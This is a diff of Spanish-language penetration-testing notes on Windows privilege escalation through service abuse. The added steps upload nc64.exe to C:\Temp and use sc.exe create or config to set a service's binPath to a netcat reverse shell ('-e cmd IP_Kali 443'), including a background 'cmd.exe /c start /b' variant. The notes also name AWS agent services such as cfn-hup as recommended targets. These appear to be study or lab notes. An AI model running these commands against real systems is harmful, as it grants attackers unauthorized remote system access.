@@ -27,10 +27,17 @@ Notas:
 
 
 Pasos:
-❯ nc.exe     # Descargar y tranferir el archivo a la máquina Windows comprometida para hacer la Revershell
+	- Subir al directorio 'C:\Temp' del server el 'nc64.exe'
 ❯ services   # Mirar todos los servicios que se estan ejecutando en Windows 
-❯ sc.exe create <service> binPath="C:\Users\omar\Desktop\nc.exe -e cmd IP 443"   # Crear un servicio 
-❯ sc.exe config <service> binPath="C:\Users\omar\Desktop\nc.exe -e cmd IP 443"   # Modificar un servicio 
+❯ sc.exe create <service> binPath="C:\Temp\nc64.exe -e cmd IP_Kali 443"   # Crear un servicio 
+❯ sc.exe create <service> binPath= "cmd.exe /c start /b C:\Temp\nc64.exe -e cmd IP_Kali 443"  <- MEJOR 
+
+❯ sc.exe config <service> binPath="C:\Temp\nc64.exe -e cmd IP_Kali 443"   # Modificar un servicio 
+❯ sc.exe config <service> binPath= "cmd.exe /c start /b C:\Temp\nc64.exe -e cmd IP_Kali 443"  <- MEJOR 
+	# AmazonSSMAgent 
+	# AWSLiteAgent 
+	# cfn-hup   = Servicio recomendado modificar 
+
 ❯ sc.exe stop <service>         # Detener un servicio 
 ❯ sc.exe start <service>        # Iniciar un servicio 
 
